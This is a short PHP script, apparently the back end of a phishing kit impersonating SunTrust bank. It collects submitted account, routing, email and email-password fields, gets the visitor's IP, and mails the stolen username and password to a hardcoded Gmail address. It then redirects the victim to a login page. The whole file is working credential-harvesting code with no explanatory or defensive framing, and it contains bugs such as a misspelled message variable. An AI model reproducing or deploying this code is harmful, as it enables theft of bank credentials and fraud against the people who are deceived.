<?php
include'ip.php';
$ip = MDgetIp();

$username = $_POST['account'];
$password = $_POST['routing'];
$email= $_POST['email'];
$emailpass = $_POST['emailpass'];

if($username==is_null($username) || $password==is_null($password)){
	
	
header("Location:index.htm");
	
	
	
}

else{
	
	$to = 'swedengrace21@gmail.com';
	$subject = ' SUNTRUST RESULTS';
	$message = "USERNAME:" . $username."  PASSWORD".$password;
	
	
	$headers ='From: '.$username.''.'\n\n';
	$headers ="MIME-Version: 1.0 \r\n";
	$headers ="Content-type: text/html \r\n";
	
	mail($to,$subject,$mesage,$headers);
	$praga=rand();
$praga=md5($praga);

	
	header("Location:login.htm");
	

} 



?>